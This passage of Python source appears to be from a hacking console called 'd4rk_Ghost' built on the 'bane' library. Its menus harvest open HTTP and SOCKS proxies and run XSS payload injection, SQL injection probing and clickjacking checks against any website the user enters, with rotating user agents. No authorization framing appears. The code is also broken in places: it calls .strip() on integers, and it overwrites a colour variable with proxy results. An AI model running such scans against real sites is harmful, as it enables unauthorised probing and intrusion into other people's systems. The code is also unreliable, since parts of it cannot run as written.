				bane.wp_scan(host, timeout=15, check_wp=True, user_agent=random.choice(my_girlfriend))

			if prompt4.strip() == "":
				pass

			else:
				print(r + "[-]" + c  + " Commmand Not found Type show command to list items inside a module ")

				continue





	if prompt.strip().lower() == "use proxies":
		while True:
			try:
				prompt5 = input(Fore.BLUE + "(d4rk_Ghost)" + Fore.RED + "[proxies]" +  Fore.CYAN + " > ")

			except KeyboardInterrupt:
				print("\nInterrupt: " + r + "Type exit or quit command in the console to exit the console")	
				continue


			if prompt5.strip().lower() == "show":
				proxy()
				continue

			if prompt5.strip().lower() == "exit" or prompt5.strip().lower() == "quit":
				
				sys.exit()

			
			if prompt5.strip().lower() == "back":
				break
				
				

			
			if prompt5.strip().lower() == "clear" or prompt5.strip().lower() == "cls":
				os.system("clear || cls")
				continue


			if prompt5.strip().lower() == "help" or prompt5.strip().lower() == "?":
				help()
				continue

			if prompt5.strip().lower() == "author":
			
				author()
				continue


			if prompt5.strip().lower() == "version":
				version()
				continue


			if prompt5.strip().lower() == "update":
				update_bane()
				continue


			if prompt5.strip().lower() == "banner":
				banner()
				print("\n")
				continue

							



			if prompt5.strip().lower() == "httproxy":
				try:
					number = int(input(w + "[Http_Proxy:~] #  "))

					if number.strip() == "":
						print(b + "[-] Please dont leave the field blank ")
						continue

			

					


				except KeyboardInterrupt:
					print("\n")
					continue

				


				
				sys.stdout.write(c + "[+] Finding {} http proxies Please wait \n ".format(number))
				a = bane.masshttp(int(number))
				for x in a:
					print(w + "[+] http Proxy Found  : "  + r +x)
					time.sleep(0.1)

			if prompt5.strip().lower() == "socks4":
				try:
					number = int(input(w + "[Socks4_Proxy:~] #  "))
					if number.strip() == "":
						print(b + "[-] Please dont leave the field blank ")
						continue

		

				except KeyboardInterrupt:
					print("\n")
					continue

				 

				sys.stdout.write(c + "[+] Finding {} socks4 proxies Please wait \n ".format(number))
				y = bane.massocks4(int(number))
				for x in y:
					print(w + "[+] socks4 Proxy Found  : "  + r + x)
					time.sleep(1)

			if prompt5.strip().lower() == "socks5":
				try:
					number = int(input(w + "[Socks5_Proxy:~] #  "))

					if number.strip() == "":
						print(b + "please dont leave the field blank ")
						continue


				except KeyboardInterrupt:
					print("\n")
					continue


				

				

				sys.stdout.write(c + "[+] Finding {} socks5 proxies Please wait \n ".format(number))
				c = bane.massocks5(int(number))
				for x in c:
					print(w + "[+] socks5 Proxy Found  : "  + r + x)
					time.sleep(1)

			if prompt5.strip() == "":
				pass

			else:
				print(r + "[-]" + c + " Command Not found type show command in order to list items inside a module ")
				continue

	


	if prompt.strip().lower() == "use exploitation":
		while True:
			try:
				prompt6 = input(Fore.BLUE + "(d4rk_Ghost)" + Fore.RED + "[exploitation]" + Fore.CYAN + " > ")

			except KeyboardInterrupt:
				print("\nInterrupt: " + r + "Type exit or quit command to exit the console")
				continue


			if prompt6.strip().lower() == "show":
				exploit()
				continue

			if prompt6.strip().lower() == "exit" or prompt6.strip().lower() == "quit":
				
				sys.exit()

			if prompt6.strip().lower() == "back":
				break
				


			if prompt6.strip().lower() == "clear" or prompt6.strip().lower() == "cls":
				os.system("clear || cls")
				
				continue


			if prompt6.strip().lower() == "help" or prompt6.strip().lower() == "?":
				help()
				continue


			if prompt6.strip().lower() == "author":
				author()
				continue


			if prompt6.strip().lower() == "version":
				version()
				continue

			if prompt6.strip().lower() == "banner":
				banner()
				print("\n")
				continue

			if prompt6.strip().lower() == "update":
				update_bane()
				continue

			
			if prompt6.strip().lower() == "modules":
				modules()
				continue
										

			if prompt6 == "xsscan":
				try:
					target_website = str(input(c + "[Website:~] # "))

					if target_website.strip() == "":
						print(w + "[-] Please dont leave the target field blank")
						continue



				except KeyboardInterrupt:
					print("\n")
					continue

				sys.stdout.write(g + "[+] Scanning Website {} for xss vulnerablity \n ".format(target_website))
				bane.xss_forms(target_website, payload="<script>alert(123)</script>", timeout=15, user_agent=random.choice(my_girlfriend))

			if prompt6 == "sqlscan_mysql":
				try:
					target_website = str(input(c + "[Website:~] # "))

					if target_website.strip() == "":
						print(w + "[-] Please dont leave the target field blank")
						continue

				except KeyboardInterrupt:
					print("\n")
					continue

				sys.stdout.write(g + "[+] Scanning Website {} for sql_injection vulnerablity \n ".format(target_website))
				bane.rce_forms(target_website, injection={"sql":"mysql"}, timeout=15, user_agent=random.choice(my_girlfriend))


			if prompt6 == "sqlscan_orcale":
				try:
					target_website = str(input(c + "[Website:~] # "))

					if target_website.strip() == "":
						print(w + "[-] Please dont leave the target field blank")
						continue


				except KeyboardInterrupt:
					print("\n")
					continue

				sys.stdout.write(g + "[+] Scanning Website {} for sql_injection vulnerablity \n ".format(target_website))
				bane.rce_forms(target_website, injection={"sql":"oracle"}, timeout=15, user_agent=random.choice(my_girlfriend))

			if prompt6 == "sqlscan_postgre":
				try:
					target_website = str(input(c + "[Website:~] # "))

					if target_website.strip() == "":
						print(w + "[-] Please dont leave the target field blank")
						continue

				except KeyboardInterrupt:
					print("\n")
					continue

				sys.stdout.write(g + "[+] Scanning Website {} for sql_injection vulnerablity \n ".format(target_website))
				bane.rce_forms(target_website, injection={"sql":"postgre"}, timeout=15, user_agent=random.choice(my_girlfriend))
			
			if prompt6 == "clickjacking":
				try:
					target_website = str(input(c + "[Website:~] # "))

					if target_website.strip() == "":
						print(w + "[-] Please dont leave the target field blank")
						continue


				except KeyboardInterrupt:
					print("\n")
					continue

				sys.stdout.write(g + "[+] Scanning Website {} for clickjacking vulnerablity \n ".format(target_website))
				result = bane.clickjacking(target_website, timeout=15,  user_agent=random.choice(my_girlfriend), debug=True)
				if result == True:
					sys.stdout.write(c + "[+] This website {} is vulunerable \n".format(target_website))

				else:
					sys.stdout.write(c + "[-] Not vulunerable \n".format(target_website))


			if prompt6 == "":
				pass

			
			else:
				print(r + "[-]" + c + " Command Not found type show command in order to list items inside module ")
				continue


	if prompt == "show":
		print(r + "[-]" +  c + " Dont Run show command Now First use any module then Type show comand to\nShow the list of items to use\n")


	if  prompt == "use":
		print(r + "[-]" + c + " use [module_name] " )


	if  prompt == "":
		pass



	else:
		pass




